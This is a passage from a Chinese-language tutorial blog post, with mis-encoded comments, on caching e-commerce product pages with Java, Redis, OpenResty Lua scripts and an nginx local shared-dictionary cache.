function_">loadBrandData</span><span class="params">(Long brandId)</span> &#123;</span><br><span class="line"><span class="comment">// æŸ¥è¯¢ä¿¡æ¯</span></span><br><span class="line">        <span class="type">BrandDTO</span> <span class="variable">brand</span> <span class="operator">=</span> itemClient.queryBrandById(brandId);</span><br><span class="line">        Map&lt;String, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;id&quot;</span>, brand.getId());</span><br><span class="line">        map.put(<span class="string">&quot;name&quot;</span>, brand.getName());</span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> JsonUtils.toJson(map);</span><br><span class="line">        <span class="comment">// å­˜å…¥Redis</span></span><br><span class="line">        redisTemplate.opsForValue().set(KEY_PREFIX_BRAND + brandId, json);</span><br><span class="line">        <span class="keyword">return</span> json;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">loadSpecData</span><span class="params">(Long categoryId)</span> &#123;</span><br><span class="line">        List&lt;SpecGroupDTO&gt; list = itemClient.querySpecGroupDetailByCategoryId(categoryId);</span><br><span class="line">        List&lt;SpecGroupNameDTO&gt; collect = list.stream().map(specGroupDTO -&gt; &#123;</span><br><span class="line">            <span class="type">SpecGroupNameDTO</span> <span class="variable">groupNameDTO</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpecGroupNameDTO</span>();</span><br><span class="line">            groupNameDTO.setName(specGroupDTO.getName());</span><br><span class="line">            groupNameDTO.setParams(BeanHelper.copyWithCollection(specGroupDTO.getParams(), SpecParamNameDTO.class));</span><br><span class="line">            <span class="keyword">return</span> groupNameDTO;</span><br><span class="line">        &#125;).collect(Collectors.toList());</span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> JsonUtils.toJson(collect);</span><br><span class="line">        redisTemplate.opsForValue().set(KEY_PREFIX_SPEC + categoryId, json);</span><br><span class="line">        <span class="keyword">return</span> json;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Boolean <span class="title function_">deleteSku</span><span class="params">(Long spuId)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> redisTemplate.delete(KEY_PREFIX_SKU + spuId);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>item.lua</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- å¯¼å…¥æ¨¡å—</span></span><br><span class="line"><span class="keyword">local</span> common = <span class="built_in">require</span>(<span class="string">&quot;common&quot;</span>)</span><br><span class="line"><span class="keyword">local</span> read_redis = common.read_redis  </span><br><span class="line"><span class="keyword">local</span> read_http = common.read_http</span><br><span class="line"><span class="keyword">local</span> cjson = <span class="built_in">require</span>(<span class="string">&quot;cjson&quot;</span>)</span><br><span class="line"><span class="keyword">local</span> template = <span class="built_in">require</span>(<span class="string">&quot;resty.template&quot;</span>)  </span><br><span class="line"><span class="comment">-- å¸¸ç”¨å˜é‡å’Œæ–¹æ³•</span></span><br><span class="line"><span class="keyword">local</span> ngx_log = ngx.<span class="built_in">log</span>  </span><br><span class="line"><span class="keyword">local</span> ngx_ERR = ngx.ERR  </span><br><span class="line"><span class="keyword">local</span> ngx_exit = ngx.<span class="built_in">exit</span>  </span><br><span class="line"><span class="keyword">local</span> ngx_print = ngx.<span class="built_in">print</span>  </span><br><span class="line"><span class="keyword">local</span> ngx_re_match = ngx.re.<span class="built_in">match</span>  </span><br><span class="line"></span><br><span class="line"><span class="comment">-- è·å–å•†å“id</span></span><br><span class="line"><span class="keyword">local</span> spuId = ngx.var.spuId</span><br><span class="line"><span class="comment">-- è·å–spu</span></span><br><span class="line"><span class="keyword">local</span> spuKey = <span class="string">&quot;page:spu:id:&quot;</span>..spuId </span><br><span class="line"><span class="keyword">local</span> spuInfoStr = read_redis(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">6379</span>, &#123;spuKey&#125;)  </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> spuInfoStr <span class="keyword">then</span>  </span><br><span class="line">   ngx_log(ngx_ERR, <span class="string">&quot;redis not found spu info, back to http, spuId : &quot;</span>, spuId)  </span><br><span class="line">   spuInfoStr = read_http(<span class="string">&quot;/spu/&quot;</span>..spuId, &#123;&#125;)  </span><br><span class="line"><span class="keyword">end</span>  </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> spuInfoStr <span class="keyword">then</span>  </span><br><span class="line">   ngx_log(ngx_ERR, <span class="string">&quot;http not found spuInfoStr info, spuId : &quot;</span>, spuId)  </span><br><span class="line">   <span class="keyword">return</span> ngx_exit(<span class="number">404</span>)  </span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- è·å–sku</span></span><br><span class="line"><span class="keyword">local</span> skuKey = <span class="string">&quot;page:sku:id:&quot;</span>..spuId </span><br><span class="line"><span class="keyword">local</span> skuInfoStr = read_redis(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">6379</span>, &#123;skuKey&#125;)  </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> skuInfoStr <span class="keyword">then</span>  </span><br><span class="line">   ngx_log(ngx_ERR, <span class="string">&quot;redis not found sku info, back to http, spuId : &quot;</span>, spuId)  </span><br><span class="line">   skuInfoStr = read_http(<span class="string">&quot;/sku/&quot;</span>..spuId, &#123;&#125;)  </span><br><span class="line"><span class="keyword">end</span>  </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> skuInfoStr <span class="keyword">then</span>  </span><br><span class="line">   ngx_log(ngx_ERR, <span class="string">&quot;http not found skuInfoStr info, spuId : &quot;</span>, spuId)  </span><br><span class="line">   <span class="keyword">return</span> ngx_exit(<span class="number">404</span>)  </span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="comment">-- è·å–spuDetail</span></span><br><span class="line"><span class="keyword">local</span> detailKey = <span class="string">&quot;page:detail:id:&quot;</span>..spuId </span><br><span class="line"><span class="keyword">local</span> detailInfoStr = read_redis(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">6379</span>, &#123;detailKey&#125;)  </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> detailInfoStr <span class="keyword">then</span>  </span><br><span class="line">   ngx_log(ngx_ERR, <span class="string">&quot;redis not found detail info, back to http, spuId : &quot;</span>, spuId)  </span><br><span class="line">   detailInfoStr = read_http(<span class="string">&quot;/detail/&quot;</span>..spuId, &#123;&#125;)  </span><br><span class="line"><span class="keyword">end</span>  </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> detailInfoStr <span class="keyword">then</span>  </span><br><span class="line">   ngx_log(ngx_ERR, <span class="string">&quot;http not found detailInfoStr info, spuId : &quot;</span>, spuId)  </span><br><span class="line">   <span class="keyword">return</span> ngx_exit(<span class="number">404</span>)  </span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="comment">-- è·å–categories</span></span><br><span class="line"><span class="keyword">local</span> spuInfo = cjson.decode(spuInfoStr)  </span><br><span class="line"><span class="keyword">local</span> cid3 = spuInfo[<span class="string">&quot;categoryIds&quot;</span>][<span class="number">3</span>]</span><br><span class="line"><span class="keyword">local</span> categoryKey = <span class="string">&quot;page:category:id:&quot;</span>..cid3 </span><br><span class="line"><span class="keyword">local</span> categoryStr = read_redis(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">6379</span>, &#123;categoryKey&#125;)  </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> categoryStr <span class="keyword">then</span>  </span><br><span class="line">   <span class="keyword">local</span> idStr = <span class="built_in">table</span>.<span class="built_in">concat</span>(spuInfo[<span class="string">&quot;categoryIds&quot;</span>],<span class="string">&quot;,&quot;</span>);</span><br><span class="line">   ngx_log(ngx_ERR, <span class="string">&quot;redis not found category info, back to http, categoryIds : &quot;</span>, idStr)  </span><br><span class="line">   categoryStr = read_http(<span class="string">&quot;/categories/&quot;</span>, &#123;ids  = idStr&#125;)</span><br><span class="line"><span class="keyword">end</span>  </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> categoryStr <span class="keyword">then</span>  </span><br><span class="line">   ngx_log(ngx_ERR, <span class="string">&quot;http not found categoryStr info, categoryId : &quot;</span>, cid3)  </span><br><span class="line">   <span class="keyword">return</span> ngx_exit(<span class="number">404</span>)  </span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="comment">-- è·å–å“ç‰Œ  </span></span><br><span class="line"><span class="keyword">local</span> brandId = spuInfo[<span class="string">&quot;brandId&quot;</span>]</span><br><span class="line"><span class="keyword">local</span> brandKey = <span class="string">&quot;page:brand:id:&quot;</span>..brandId </span><br><span class="line"><span class="keyword">local</span> brandStr = read_redis(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">6379</span>, &#123;brandKey&#125;)  </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> brandStr <span class="keyword">then</span>  </span><br><span class="line">   ngx_log(ngx_ERR, <span class="string">&quot;redis not found brand info, back to http, brandId : &quot;</span>, brandId)  </span><br><span class="line">   brandStr = read_http(<span class="string">&quot;/brand/&quot;</span>..brandId, &#123;&#125;)</span><br><span class="line"><span class="keyword">end</span>  </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> brandStr <span class="keyword">then</span>  </span><br><span class="line">   ngx_log(ngx_ERR, <span class="string">&quot;http not found brandStr info, brandId : &quot;</span>, brandId)  </span><br><span class="line">   <span class="keyword">return</span> ngx_exit(<span class="number">404</span>)  </span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="comment">-- è·å–è§„æ ¼</span></span><br><span class="line"><span class="keyword">local</span> specKey = <span class="string">&quot;page:spec:id:&quot;</span>..cid3 </span><br><span class="line"><span class="keyword">local</span> specStr = read_redis(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">6379</span>, &#123;specKey&#125;)  </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> specStr <span class="keyword">then</span>  </span><br><span class="line">   ngx_log(ngx_ERR, <span class="string">&quot;redis not found spec info, back to http, cid3 : &quot;</span>, cid3)  </span><br><span class="line">   specStr = read_http(<span class="string">&quot;/spec/&quot;</span>..cid3, &#123;&#125;)</span><br><span class="line"><span class="keyword">end</span>  </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> specStr <span class="keyword">then</span>  </span><br><span class="line">   ngx_log(ngx_ERR, <span class="string">&quot;http not found specStr info, cid3 : &quot;</span>, cid3)  </span><br><span class="line">   <span class="keyword">return</span> ngx_exit(<span class="number">404</span>)  </span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="comment">-- ç»„ç»‡æ•°æ®</span></span><br><span class="line"><span class="keyword">local</span> context = &#123;</span><br><span class="line">	name = spuInfo[<span class="string">&quot;name&quot;</span>],</span><br><span class="line">	skuList =  skuInfoStr,</span><br><span class="line">	detail =  detailInfoStr,</span><br><span class="line">	categories =  categoryStr,</span><br><span class="line">	brand =  brandStr,</span><br><span class="line">	specs =  specStr</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">--æ¸²æŸ“æ¨¡æ¿  </span></span><br><span class="line">template.render(<span class="string">&quot;item.html&quot;</span>, context)</span><br></pre></td></tr></table></figure>

<h3 id="ä¼˜åŒ–"><a href="#ä¼˜åŒ–" class="headerlink" title="ä¼˜åŒ–"></a>ä¼˜åŒ–</h3><ul>
<li>åœ¨Nginxä¸­è®¾ç½®æœ¬åœ°ç¼“å­˜ï¼ŒæŠŠå‡ ä¹ä¸å˜çš„æ•°æ®ç›´æ¥å­˜å‚¨åœ¨nginxå†…éƒ¨ï¼Œä¾‹å¦‚ï¼š<ul>
<li>å•†å“åˆ†ç±»æ•°æ®</li>
<li>å“ç‰Œæ•°æ®</li>
<li>è§„æ ¼å‚æ•°æ•°æ®</li>
</ul>
</li>
<li>åœ¨nginxä¸­å¯¹ç”Ÿæˆçš„é¡µé¢åšç¼“å­˜æˆ–é™æ€åŒ–ï¼ŒåšCDNæœåŠ¡ï¼Œé¡µé¢ä¸å˜çš„æ—¶å€™ï¼Œå‡å°‘æ¸²æŸ“å¯¹CPUçš„æ¶ˆè€—</li>
<li>éšç€å•†å“æ•°æ®çš„æ—¥ç›Šå¢å¤šï¼ŒRediså¯èƒ½éš¾ä»¥æ”¯æŒæµ·é‡å•†å“ä¿¡æ¯ï¼Œæ­¤æ—¶å¯ä»¥ç”¨SSDBæ¥ä»£æ›¿ï¼ŒSSDBå­˜å‚¨åŸºäºç£ç›˜å­˜å‚¨ï¼ŒæŸ¥è¯¢æ€§èƒ½ä¸Rediså·®ä¸å¤šï¼Œå› æ­¤å¯ä»¥ä½œä¸ºæµ·é‡æ•°æ®çš„ç¼“å­˜åº“</li>
</ul>
<p>ä¿®æ”¹nginx.conf,é…ç½®æœ¬åœ°ç¼“å­˜çš„å¤§å°ï¼š</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">worker_processes</span>  <span class="number">1</span>;</span><br><span class="line"><span class="attribute">error_log</span> logs/<span class="literal">error</span>.log;</span><br><span class="line"><span class="section">events</span> &#123;</span><br><span class="line">    <span class="attribute">worker_connections</span> <span class="number">1024</span>;</span><br><span class="line">&#125;  </span><br><span class="line"><span class="section">http</span> &#123;</span><br><span class="line">	</span><br><span class="line">    <span class="attribute">lua_package_path</span> <span class="string">&quot;/usr/local/openresty/lualib/?.lua;;&quot;</span>;  <span class="comment">#lua æ¨¡å—  </span></span><br><span class="line">    <span class="attribute">lua_package_cpath</span> <span class="string">&quot;/usr/local/openresty/lualib/?.so;;&quot;</span>;  <span class="comment">#cæ¨¡å— </span></span><br><span class="line">    <span class="comment">#æœ¬åœ°ç¼“å­˜ï¼Œåç§°å«åšï¼šitem_local_cacheï¼Œå¤§å°50m</span></span><br><span class="line">	<span class="attribute">lua_shared_dict</span> item_local_cache <span class="number">50m</span>; </span><br><span class="line">	</span><br><span class="line">    <span class="attribute">default_type</span>  text/html; <span class="comment"># é»˜è®¤å“åº”ç±»å‹æ˜¯html</span></span><br><span class="line">    <span class="comment">#include lua.conf;    # å¼•å…¥ä¸€ä¸ªlua.confæ–‡ä»¶</span></span><br><span class="line">    <span class="attribute">include</span> leyou.conf;    <span class="comment"># å¼•å…¥ä¸€ä¸ªleyou.confæ–‡ä»¶</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¿®æ”¹common.luaï¼Œæ·»åŠ æ•°æ®æŸ¥è¯¢æ–¹æ³•ï¼š</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- å¯¼å…¥redisæ¨¡å—</span></span><br><span class="line"><span class="keyword">local</span> redis = <span class="built_in">require</span>(<span class="string">&quot;resty.redis&quot;</span>) </span><br><span class="line"><span class="comment">-- é…ç½®å•†å“çš„æœ¬åœ°ç¼“å­˜ </span></span><br><span class="line"><span class="keyword">local</span> local_cache = ngx.shared.item_local_cache</span><br><span class="line"><span class="comment">-- æ—¥å¿—</span></span><br><span class="line"><span class="keyword">local</span> ngx_log = ngx.<span class="built_in">log</span>  </span><br><span class="line"><span class="keyword">local</span> ngx_ERR = ngx.ERR</span><br><span class="line"><span class="comment">-- è¯»å–æœ¬åœ°ç¼“å­˜</span></span><br><span class="line"><span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">cache_get</span><span class="params">(key)</span></span>  </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> local_cache <span class="keyword">then</span>  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>  </span><br><span class="line">    <span class="keyword">end</span>  </span><br><span class="line">    <span class="keyword">return</span> local_cache:get(key)  </span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="comment">-- å†™å…¥æœ¬åœ°ç¼“å­˜</span></span><br><span class="line"><span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">cache_set</span><span class="params">(key, value)</span></span>  </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> local_cache <span class="keyword">then</span>  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>  </span><br><span class="line">    <span class="keyword">end</span>  </span><br><span class="line">    <span class="keyword">return</span> local_cache:set(key, value, <span class="number">10</span> * <span class="number">60</span>) <span class="comment">--10åˆ†é’Ÿ  </span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">close_redis</span><span class="params">(red)</span></span>  </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> red <span class="keyword">then</span>  </span><br><span class="line">        <span class="keyword">return</span>  </span><br><span class="line">    <span class="keyword">end</span>  </span><br><span class="line">    <span class="comment">--é‡Šæ”¾è¿æ¥(è¿æ¥æ± å®ç°)  </span></span><br><span class="line">    <span class="keyword">local</span> pool_max_idle_time = <span class="number">10000</span> <span class="comment">--æ¯«ç§’  </span></span><br><span class="line">    <span class="keyword">local</span> pool_size = <span class="number">100</span> <span class="comment">--è¿æ¥æ± å¤§å°  </span></span><br><span class="line">    <span class="keyword">local</span> ok, err = red:set_keepalive(pool_max_idle_time, pool_size)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> ok <span class="keyword">then</span>  </span><br><span class="line">        ngx_log(ngx_ERR, <span class="string">&quot;set redis keepalive error : &quot;</span>, err)  </span><br><span class="line">    <span class="keyword">end</span>  </span><br><span class="line"><span class="keyword">end</span>  </span><br><span class="line"><span class="comment">-- æŸ¥è¯¢æœ¬åœ°ç¼“å­˜ï¼Œæ²¡æœ‰åˆ™æŸ¥è¯¢redis, ipå’Œportæ˜¯redisåœ°å€ï¼Œkeyæ˜¯æŸ¥è¯¢çš„key</span></span><br><span class="line"><span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">read_cache</span><span class="params">(ip, port, key)</span></span> </span><br><span class="line">	<span class="comment">-- å°è¯•è¯»æœ¬åœ°ç¼“å­˜</span></span><br><span class="line">	<span class="keyword">local</span> resp = cache_get(key)</span><br><span class="line">	<span class="comment">-- ngx_log(ngx_ERR, &quot;debug local cache data : &quot;, resp) </span></span><br><span class="line">	<span class="keyword">if</span> <span class="keyword">not</span> resp <span class="keyword">then</span></span><br><span class="line">		ngx_log(ngx_ERR, <span class="string">&quot;read local cache fail , key&quot;</span>, key)</span><br><span class="line">		<span class="comment">-- è·å–ä¸€ä¸ªredisè¿æ¥</span></span><br><span class="line">		<span class="keyword">local</span> red = redis:new()  </span><br><span class="line">		red:set_timeout(<span class="number">1000</span>)  </span><br><span class="line">		<span class="keyword">local</span> ok, err = red:connect(ip, port)  </span><br><span class="line">		<span class="keyword">if</span> <span class="keyword">not</span> ok <span class="keyword">then</span>  </span><br><span class="line">			ngx_log(ngx_ERR, <span class="string">&quot;connect to redis error : &quot;</span>, err)  </span><br><span class="line">			<span class="keyword">return</span> close_redis(red)  </span><br><span class="line">		<span class="keyword">end</span></span><br><span class="line">		<span class="comment">-- åˆ©ç”¨getæŸ¥è¯¢</span></span><br><span class="line">		resp, err = red:get(key) </span><br><span class="line">	<span class="keyword">end</span></span><br><span class="line">	<span class="comment">-- æŸ¥è¯¢å¤±è´¥å¤„ç†</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> resp <span class="keyword">then</span>  </span><br><span class="line">        ngx_log(ngx_ERR, <span class="string">&quot;get redis content error : &quot;</span>, err)  </span><br><span class="line">        <span class="keyword">return</span> close_redis(red)  </span><br><span class="line">    <span class="keyword">end</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">--å¾—åˆ°çš„æ•°æ®ä¸ºç©ºå¤„ç†  </span></span><br><span class="line">    <span class="keyword">if</span> resp == ngx.null <span class="keyword">then</span>  </span><br><span class="line">        resp = <span class="literal">nil</span>  </span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">	cache_set(key, resp)</span><br><span class="line">    close_redis(red)  </span><br><span class="line">    <span class="keyword">return</span> resp  </span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="comment">-- æŸ¥è¯¢redisçš„æ–¹æ³• ipå’Œportæ˜¯redisåœ°å€ï¼Œkeysæ˜¯æŸ¥è¯¢çš„keyï¼Œæ•°ç»„æ ¼å¼</span></span><br><span class="line"><span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">read_redis</span><span class="params">(ip, port, key)</span></span>  </span><br><span class="line">	<span class="comment">-- è·å–ä¸€ä¸ªè¿æ¥</span></span><br><span class="line">    <span class="keyword">local</span> red = redis:new()  </span><br><span class="line">    red:set_timeout(<span class="number">1000</span>)  </span><br><span class="line">    <span class="keyword">local</span> ok, err = red:connect(ip, port)  </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> ok <span class="keyword">then</span>  </span><br><span class="line">        ngx_log(ngx_ERR, <span class="string">&quot;connect to redis error : &quot;</span>, err)  </span><br><span class="line">        <span class="keyword">return</span> close_redis(red)  </span><br><span class="line">    <span class="keyword">end</span>  </span><br><span class="line">    <span class="keyword">local</span> resp = <span class="literal">nil</span></span><br><span class="line">	<span class="comment">-- åˆ©ç”¨getæŸ¥è¯¢ </span></span><br><span class="line">    resp, err = red:get(key)  </span><br><span class="line">	<span class="comment">-- æŸ¥è¯¢å¤±è´¥å¤„ç†</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> resp <span class="keyword">then</span>  </span><br><span class="line">        ngx_log(ngx_ERR, <span class="string">&quot;get redis content error : &quot;</span>, err)  </span><br><span class="line">        <span class="keyword">return</span> close_redis(red)  </span><br><span class="line">    <span class="keyword">end</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">--å¾—åˆ°çš„æ•°æ®ä¸ºç©ºå¤„ç†  </span></span><br><span class="line">    <span class="keyword">if</span> resp == ngx.null <span class="keyword">then</span>  </span><br><span class="line">        resp = <span class="literal">nil</span>  </span><br><span class="line">    <span class="keyword">end</span>  </span><br><span class="line">    close_redis(red)  </span><br><span class="line">    <span class="keyword">return</span> resp  </span><br><span class="line"><span class="keyword">end</span> </span><br><span class="line"><span class="comment">-- æŸ¥è¯¢httpè¯·æ±‚çš„æ–¹æ³•ï¼Œpathæ˜¯è¯·æ±‚è·¯å¾„ï¼Œargsæ˜¯å‚æ•°ï¼Œtableæ ¼å¼</span></span><br><span class="line"><span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">read_http</span><span class="params">(path, args)</span></span> </span><br><span class="line">	<span class="comment">-- é»˜è®¤æŸ¥è¯¢åœ°å€èµ° /backend/page/,å†…éƒ¨è½¬å‘åˆ°8083ç«¯å£</span></span><br><span class="line">    <span class="keyword">local</span> resp = ngx.location.capture(<span class="string">&quot;/backend/page&quot;</span>..<span class="built_in">path</span>, &#123;  </span><br><span class="line">        method = ngx.HTTP_GET,  </span><br><span class="line">        args = args  </span><br><span class="line">    &#125;)  </span><br><span class="line">	<span class="comment">-- æŸ¥è¯¢å¤±è´¥çš„å¤„ç†</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> resp <span class="keyword">then</span>  </span><br><span class="line">        ngx_log(ngx_ERR, <span class="string">&quot;request error&quot;</span>)  </span><br><span class="line">        <span class="keyword">return</span>  </span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">	<span class="comment">-- è¿”å›çŠ¶æ€ç ä¸æ˜¯200å°±æŠ¥é”™</span></span><br><span class="line">    <span class="keyword">if</span> resp.<span class="built_in">status</span> ~= <span class="number">200</span> <span class="keyword">then</span>  </span><br><span class="line">        ngx_log(ngx_ERR, <span class="string">&quot;request error, status :&quot;</span>, resp.<span class="built_in">status</span>)  </span><br><span class="line">        <span class="keyword">return</span>  </span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">return</span> resp.body  </span><br><span class="line"><span class="keyword">end</span>  </span><br><span class="line"><span class="comment">-- å°†æ–¹æ³•å¯¼å‡º</span></span><br><span class="line"><span class="keyword">local</span> _M = &#123;  </span><br><span class="line">    read_redis = read_redis,  </span><br><span class="line">    read_cache = read_cache,  </span><br><span class="line">    read_http = read_http  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">return</span> _M </span><br></pre></td></tr></table></figure>



<p>æ”¹é€ <code>item.lua</code>ï¼Œå°†åˆ†ç±»ã€å“ç‰Œã€è§„æ ¼æŸ¥è¯¢èµ°æœ¬åœ°ç¼“å­˜</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- å¯¼å…¥æ¨¡å—</span></span><br><span class="line"><span class="keyword">local</span> common = <span class="built_in">require</span>(<span class="string">&quot;common&quot;</span>)</span><br><span class="line"><span class="keyword">local</span> read_redis = common.read_redis  </span><br><span class="line"><span class="keyword">local</span> read_http = common.read_http</span><br><span class="line"><span class="keyword">local</span> read_cache = common.read_cache</span><br><span class="line"><span class="keyword">local</span> cjson = <span class="built_in">require</span>(<span class="string">&quot;cjson&quot;</span>)</span><br><span class="line"><span class="keyword">local</span> template = <span class="built_in">require</span>(<span class="string">&quot;resty.template&quot;</span>)  </span><br><span class="line"><span class="comment">-- å¸¸ç”¨å˜é‡å’Œæ–¹æ³•</span></span><br><span class="line"><span class="keyword">local</span> ngx_log = ngx.<span class="built_in">log</span>  </span><br><span class="line"><span class="keyword">local</span> ngx_ERR = ngx.ERR  </span><br><span class="line"><span class="keyword">local</span> ngx_exit = ngx.<span class="built_in">exit</span>  </span><br><span class="line"><span class="keyword">local</span> ngx_print = ngx.<span class="built_in">print</span>  </span><br><span class="line"><span class="keyword">local</span> ngx_re_match = ngx.re.<span class="built_in">match</span>  </span><br><span class="line"></span><br><span class="line"><span class="comment">-- è·å–å•†å“id</span></span><br><span class="line"><span class="keyword">local</span> spuId = ngx.var.spuId</span><br><span class="line"><span class="comment">-- è·å–spu</span></span><br><span class="line"><span class="keyword">local</span> spuKey = <span class="string">&quot;page:spu:id:&quot;</span>..spuId </span><br><span class="line"><span class="keyword">local</span> spuInfoStr = read_redis(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">6379</span>, spuKey)  </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> spuInfoStr <span class="keyword">then</span>  </span><br><span class="line">   ngx_log(ngx_ERR, <span class="string">&quot;redis not found spu info, back to http, spuId : &quot;</span>, spuId)  </span><br><span class="line">   spuInfoStr = read_http(<span class="string">&quot;/spu/&quot;</span>..spuId, &#123;&#125;)  </span><br><span class="line"><span class="keyword">end</span>  </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> spuInfoStr <span class="keyword">then</span>  </span><br><span class="line">   ngx_log(ngx_ERR, <span class="string">&quot;http not found spuInfoStr info, spuId : &quot;</span>, spuId)  </span><br><span class="line">   <span class="keyword">return</span> ngx_exit(<span class="number">404</span>)  </span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- è·å–sku</span></span><br><span class="line"><span class="keyword">local</span> skuKey = <span class="string">&quot;page:sku:id:&quot;</span>..spuId </span><br><span class="line"><span class="keyword">local</span> skuInfoStr = read_redis(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">6379</span>, skuKey)  </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> skuInfoStr <span class="keyword">then</span>  </span><br><span class="line">   ngx_log(ngx_ERR, <span class="string">&quot;redis not found sku info, back to http, spuId : &quot;</span>, spuId)  </span><br><span class="line">   skuInfoStr = read_http(<span class="string">&quot;/sku/&quot;</span>..spuId, &#123;&#125;)  </span><br><span class="line"><span class="keyword">end</span>  </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> skuInfoStr <span class="keyword">then</span>  </span><br><span class="line">   ngx_log(ngx_ERR, <span class="string">&quot;http not found skuInfoStr info, spuId : &quot;</span>, spuId)  </span><br><span class="line">   <span class="keyword">return</span> ngx_exit(<span class="number">404</span>)  </span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="comment">-- è·å–spuDetail</span></span><br><span class="line"><span class="keyword">local</span> detailKey = <span class="string">&quot;page:detail:id:&quot;</span>..spuId </span><br><span class="line"><span class="keyword">local</span> detailInfoStr = read_redis(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">6379</span>, detailKey)  </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> detailInfoStr <span class="keyword">then</span>  </span><br><span class="line">   ngx_log(ngx_ERR, <span class="string">&quot;redis not found detail info, back to http, spuId : &quot;</span>, spuId)  </span><br><span class="line">   detailInfoStr = read_http(<span class="string">&quot;/detail/&quot;</span>..spuId, &#123;&#125;)  </span><br><span class="line"><span class="keyword">end</span>  </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> detailInfoStr <span class="keyword">then</span>  </span><br><span class="line">   ngx_log(ngx_ERR, <span class="string">&quot;http not found detailInfoStr info, spuId : &quot;</span>, spuId)  </span><br><span class="line">   <span class="keyword">return</span> ngx_exit(<span class="number">404</span>)  </span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="comment">-- è·å–categories</span></span><br><span class="line"><span class="keyword">local</span> spuInfo = cjson.decode(spuInfoStr)  </span><br><span class="line"><span class="keyword">local</span> cid3 = spuInfo[<span class="string">&quot;categoryIds&quot;</span>][<span class="number">3</span>]</span><br><span class="line"><span class="keyword">local</span> categoryKey = <span class="string">&quot;page:category:id:&quot;</span>..cid3 </span><br><span 